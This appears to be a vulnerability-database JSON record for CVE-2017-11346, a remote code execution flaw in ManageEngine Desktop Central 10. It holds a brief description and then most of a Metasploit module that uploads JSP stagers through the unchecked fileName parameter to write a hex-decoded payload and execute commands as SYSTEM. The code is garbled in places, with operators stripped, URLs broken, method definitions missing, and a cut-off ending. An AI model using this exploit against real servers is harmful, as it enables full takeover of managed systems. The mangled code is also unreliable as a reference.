{
    "text": "vul_name : ManageEngine Desktop Central 10 Build 100087 Remote Code Execution ， vul_cve : CVE-2017-11346 ， vul_poc :  # Exploit Title : ManageEngine Desktop Central 10 Build 100087 RCE ，  # Date : 24-07-2017 ，  # Software Link :  ，  # Exploit Author : Kacper Szurek ，  # Contact :  ，  # Website :  ，  # CVE : CVE-2017-11346 ，  # Category : remote ， 1. Description ， When uploading a file , the `FileUploadServlet` class does not check the user-controlled `fileName` parameter using `hasVulnerabilityInFileName` function. ， This allows a remote attacker to create a malicious file and place it under a directory that allows server-side scripts to run , which results in remote code execution under the context of SYSTEM. ， 2. Proof of Concept ， Metasploit module :  ， manageengine_filename_rce.rb :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'nokogiri' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"ManageEngine Desktop Central 10 FileUploadServlet fileName RCE Vulnerability\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in ManageEngine Desktop Central 10. When ， uploading a file , the FileUploadServlet class does not check the user-controlled ， fileName parameter. This allows a remote attacker to create a malicious file and place ， it under a directory that allows server-side scripts to run ,  ， which results in remote code execution under the context of SYSTEM. ， This exploit was successfully tested on version 10 , build 100087. ， Exploit code based on ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [ 'Kacper Szurek' ]  ,  ， ' ，  [  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'ManageEngine Desktop Central 10 on Windows' , {} ]  ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ， } ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"July 24 2017\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path for ManageEngine Desktop Central' , '/' ]  )  ,  ， Opt : RPORT ( 8020 )  ，  ]  , self.class )  ， end ， jspraw = %Q | <% @ page import=\"java.io. * \" %>\\n |  ， jspraw %Q | <%\\n |  ， jspraw %Q | String data = \" # {Rex : Text.to_hex ( bin_data , \" ) }\" ; \\n |  ， jspraw %Q | FileOutputStream outputstream = new FileOutputStream ( \" # {output_file}\" )  ; \\n |  ， jspraw %Q | int numbytes = data.length (  )  ; \\n |  ， jspraw %Q | byte [  ] bytes = new byte [ numbytes/2 ]  ; \\n |  ， jspraw %Q | for ( int counter = 0 ; counter < numbytes ; counter += 2 ) \\n |  ， jspraw %Q | {\\n |  ， jspraw %Q | char char1 = ( char ) data.charAt ( counter )  ; \\n |  ， jspraw %Q | char char2 = ( char ) data.charAt ( counter + 1 )  ; \\n |  ， jspraw %Q | int comb = Character.digit ( char1 , 16 ) & 0xff ; \\n |  ， jspraw %Q | comb = 4 ; \\n |  ， jspraw %Q | comb += Character.digit ( char2 , 16 ) & 0xff ; \\n |  ， jspraw %Q | bytes [ counter/2 ] = ( byte ) comb ; \\n |  ， jspraw %Q | }\\n |  ， jspraw %Q | outputstream.write ( bytes )  ; \\n |  ， jspraw %Q | outputstream.close (  )  ; \\n |  ， jspraw %Q | %>\\n |  ， jspraw ， end ， jspraw = %Q | <% @ page import=\"java.io. * \" %>\\n |  ， jspraw %Q | <%\\n |  ， jspraw %Q | try {\\n |  ， jspraw %Q | Runtime.getRuntime (  ) .exec ( \"chmod +x # {command}\" )  ; \\n |  ， jspraw %Q | } catch ( IOException ioe ) { }\\n |  ， jspraw %Q | Runtime.getRuntime (  ) .exec ( \" # {command}\" )  ; \\n |  ， jspraw %Q | %>\\n |  ， jspraw ， end ， def get_jsp_stager",
    "time": "2017.07.25"
}